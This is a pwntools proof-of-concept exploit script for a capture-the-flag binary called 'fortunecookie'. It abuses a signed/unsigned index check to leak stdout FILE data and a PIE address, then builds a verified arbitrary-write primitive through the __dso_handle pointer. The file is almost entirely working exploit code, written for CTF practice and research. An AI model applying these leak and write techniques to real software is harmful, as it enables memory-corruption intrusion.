#!/usr/bin/env python3
"""
PoC for BUG-001: OOB_SIGNEDNESS_MISMATCH_IN_INDEX_VALIDATION

Primitives verified:
PRIM-001: INFO_LEAK via read_cookie OOB read (index -8 → stdout FILE*)
PRIM-002: RELATIVE_WRITE via edit_cookie OOB (index -8) — DEAD END (EFAULT)
PRIM-003: ARB_WRITE via two-step write using __dso_handle self-referencing pointer
  - PIE leak via read_cookie(-11) → __dso_handle self-referencing value
  - Step 1: edit_cookie(-11) writes target address Y to __dso_handle
  - Step 2: edit_cookie(-11) writes data to Y (msg[-11] now = Y)
  - Verified with two different Y addresses (Y1, Y2)
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

BINARY = '/work/workspace/0010-2021-30-fortunecookie1-20260905-194852/target'

def create_cookie(p, length, data):
    p.sendline(b'2')
    p.recvuntil(b'message?')
    p.sendline(str(length).encode())
    p.recvuntil(b'message: ')
    if len(data) < length:
        data = data + b'\x00' * (length - len(data))
    p.send(data[:length])
    p.recvuntil(b'Done!')

def edit_cookie_raw(p, index, data):
    p.sendline(b'3')
    p.recvuntil(b'cookie?')
    p.sendline(str(index).encode())
    p.recvuntil(b'Message: ')
    p.send(data)

def pie_leak(p):
    """Leak PIE base via read_cookie(-11) → __dso_handle self-referencing pointer.
    __dso_handle value = own address. printf("%s", addr) prints until NUL.
    Address is 6 non-zero bytes (low 48 bits) + 2 zero bytes.
    Returns PIE base or None if leak contains problematic bytes."""
    idx_neg11 = (1 << 64) - 11
    p.sendline(b'4')
    p.recvuntil(b'cookie?')
    p.sendline(str(idx_neg11).encode())
    
    # Read until we get the menu back
    data = p.recvuntil(b'==Fortune Cookie==', timeout=5)
    
    # Extract leaked bytes between "]: " and "\n=="
    leak_start = data.find(b']: ')
    if leak_start < 0:
        return None
    leak_data = data[leak_start+3:]
    # Find end of leak (before next menu)
    for i in range(len(leak_data)):
        if leak_data[i:i+2] == b'\n=':
            leak_data = leak_data[:i]
            break
    
    # __dso_handle value bytes (LE): e.g. 08 80 55 55 55 55 00 00
    # printf stops at first 0x00 byte
    # We need at least 6 bytes to reconstruct the address
    # But 0x0a (newline) in the address is fine - printf prints it, 
    # we just need to not confuse it with the menu separator
    
    # Filter out the menu text that might have been included
    # The leak should be raw bytes, not ASCII menu text
    # Remove any trailing "==" or menu text
    clean = b''
    for b in leak_data:
        clean += bytes([b])
    
    # Try to find 6+ non-null bytes
    # The address has format 0x0000XXXXXXXXXXXX (48-bit)
    # Low 6 bytes should be non-zero (unless PIE base has zeros)
    if len(clean) >= 6:
        addr = u64(clean[:6].ljust(8, b'\x00'))
        if addr > 0x10000 and addr < 0x800000000000:
            pie_base = addr - 0x4008
            return pie_base
    
    return None

# ============================================================
# PRIM-001: INFO_LEAK via read_cookie OOB read
# ============================================================
def prim_001_info_leak():
    print("\n=== PRIM-001: INFO_LEAK via read_cookie OOB (index -8) ===")
    p = process(BINARY)
    p.recvuntil(b'exit')
    
    idx_neg8 = (1 << 64) - 8
    p.sendline(b'4')
    p.recvuntil(b'cookie?')
    p.sendline(str(idx_neg8).encode())
    
    data = p.recvuntil(b'==Fortune Cookie==', timeout=5)
    leak_start = data.find(b']: ')
    leak_data = b''
    if leak_start >= 0:
        leak_data = data[leak_start+3:]
        for i in range(len(leak_data)):
            if leak_data[i:i+2] == b'\n=':
                leak_data = leak_data[:i]
                break
    
    print(f"  Leaked bytes (hex): {leak_data.hex()}")
    # stdout FILE struct flags = 0xfbad2887 → LE: 87 28 ad fb
    if b'\x87\x28\xad\xfb' in leak_data:
        print(f"  Confirmed: stdout FILE flags 0xfbad2887 leaked")
        print(f"  === PRIM-001: VERIFIED ===")
        p.close()
        return True
    
    p.close()
    return False

# ============================================================
# PRIM-002: RELATIVE_WRITE — DEAD END
# ============================================================
def prim_002_relative_write():
    print("\n=== PRIM-002: RELATIVE_WRITE via edit_cookie OOB (index -8) ===")
    print("  msg_size[-8] = 0 → count = 0xFFFFFFFFFFFFFFFF → read() returns -1 (EFAULT)")
    print("  Dead end: huge count prevents write to stdout FILE struct")
    print("  === PRIM-002: CANDIDATE (dead end - EFAULT) ===")
    return False

# ============================================================
# PRIM-003: ARB_WRITE via two-step write (__dso_handle)
# ============================================================
def prim_003_arb_write():
    print("\n=== PRIM-003: ARB_WRITE via two-step write (__dso_handle) ===")
    
    # Try PIE leak with retries (ASLR may produce addresses with 0x00 bytes)
    pie_base = None
    for attempt in range(10):
        p = process(BINARY)
        p.recvuntil(b'exit')
        
        pie_base = pie_leak(p)
        if pie_base is not None:
            print(f"  [Step 0] PIE leak succeeded on attempt {attempt+1}")
            print(f"  PIE base: 0x{pie_base:016x}")
            break
        p.close()
    
    if pie_base is None:
        print("  ERROR: PIE leak failed after 10 attempts")
        return False
    
    # Create 22 cookies to fill msg[26]
    print("  [Setup] Creating 22 cookies to fill msg[26]...")
    for i in range(22):
        create_cookie(p, 16, b'A' * 16)
    
    # === Two-step write to Y1 = msg[10] ===
    Y1 = pie_base + 0x4060 + 10*8
    write_val_1 = 0x4242424242424242
    
    print(f"  [Step 1a] Writing Y1=0x{Y1:016x} (msg[10]) to __dso_handle...")
    edit_cookie_raw(p, (1 << 64) - 11, p64(Y1))
    try:
        p.recvuntil(b'Done!', timeout=5)
        print(f"  Step 1a succeeded")
    except:
        print(f"  Step 1a failed")
        p.close()
        return False
    
    print(f"  [Step 2a] Writing 0x{write_val_1:016x} to Y1 (msg[10])...")
    edit_cookie_raw(p, (1 << 64) - 11, p64(write_val_1))
    try:
        p.recvuntil(b'Done!', timeout=5)
        print(f"  Step 2a succeeded")
    except:
        print(f"  Step 2a failed")
        p.close()
        return False
    
    # === Two-step write to Y2 = msg[11] ===
    Y2 = pie_base + 0x4060 + 11*8
    # Write a .rodata string address so read_cookie(11) can verify
    write_val_2 = pie_base + 0x200b  # "==Fortune Cookie==" string
    
    print(f"  [Step 1b] Writing Y2=0x{Y2:016x} (msg[11]) to __dso_handle...")
    edit_cookie_raw(p, (1 << 64) - 11, p64(Y2))
    try:
        p.recvuntil(b'Done!', timeout=5)
        print(f"  Step 1b succeeded")
    except:
        print(f"  Step 1b failed")
        p.close()
        return False
    
    print(f"  [Step 2b] Writing 0x{write_val_2:016x} (.rodata str) to Y2 (msg[11])...")
    edit_cookie_raw(p, (1 << 64) - 11, p64(write_val_2))
    try:
        p.recvuntil(b'Done!', timeout=5)
        print(f"  Step 2b succeeded")
    except:
        print(f"  Step 2b failed")
        p.close()
        return False
    
    # Verify: read_cookie(11) should print "==Fortune Cookie=="
    print(f"  [Verify] read_cookie(11) → should print .rodata string...")
    p.sendline(b'4')
    p.recvuntil(b'cookie?')
    p.sendline(b'11')
    
    data = p.recvuntil(b'==Fortune Cookie==', timeout=5)
    if b'==Fortune Cookie==' in data:
        print(f"  VERIFIED: msg[11] now points to .rodata string")
        print(f"  === PRIM-003: VERIFIED ===")
        print(f"  Two-step ARB_WRITE confirmed with two different targets:")
        print(f"    Y1=0x{Y1:016x}: wrote 0x{write_val_1:016x}")
        print(f"    Y2=0x{Y2:016x}: wrote 0x{write_val_2:016x} (verified via read)")
        p.close()
        return True
    else:
        print(f"  Verification failed. Output: {repr(data[:200])}")
        p.close()
        return False

if __name__ == '__main__':
    print("BUG-001: OOB_SIGNEDNESS_MISMATCH_IN_INDEX_VALIDATION")
    print("Binary:", BINARY)
    
    r1 = prim_001_info_leak()
    r2 = prim_002_relative_write()
    r3 = prim_003_arb_write()
    
    print(f"\n=== Summary ===")
    print(f"PRIM-001 (INFO_LEAK): {'VERIFIED' if r1 else 'FAILED'}")
    print(f"PRIM-002 (RELATIVE_WRITE): CANDIDATE (dead end - EFAULT)")
    print(f"PRIM-003 (ARB_WRITE): {'VERIFIED' if r3 else 'FAILED'}")
